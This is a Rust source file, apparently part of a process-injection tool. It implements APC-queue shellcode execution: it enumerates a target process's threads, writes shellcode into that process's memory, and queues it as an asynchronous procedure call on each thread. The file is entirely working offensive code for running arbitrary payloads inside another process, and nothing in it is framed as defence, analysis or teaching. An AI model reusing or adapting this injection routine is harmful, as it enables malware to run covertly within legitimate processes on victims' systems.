use windows::Win32::{Foundation::PAPCFUNC, System::Threading::THREAD_SET_CONTEXT};

use crate::wrappers::{
    RemoteAllocator, RemoteProcess, RemoteThread
};

use super::ExecutionMethod;
pub(super) struct QueueUserAPCExecutor;

impl ExecutionMethod for QueueUserAPCExecutor {
    fn execute(
        remote_process: &RemoteProcess,
        shellcode_to_exec: &Vec<u8>,
    ) -> Result<(), Box<dyn std::error::Error>> {
        // 1. get & enumerate threads of remote proc
        let thread_ids = remote_process.get_thread_ids()?;

        let shellcode_mem = remote_process.write_shellcode(shellcode_to_exec)?;

        let p_thread_start_func: Option<unsafe extern "system" fn(usize)> = unsafe { std::mem::transmute(shellcode_mem) };

        // 2. Queue APC to each thread
        for tid in thread_ids { // TODO: improve selection of thread, discover DLL reinjection ability, what are we not cleaning up?
            let remote_thread = RemoteThread::open(tid, THREAD_SET_CONTEXT)?;
            
            let p_apc_func: PAPCFUNC = Some(p_thread_start_func.unwrap());   
            remote_thread.queue_user_apc(p_apc_func, 0)?;
        }

        Ok(())
    }
}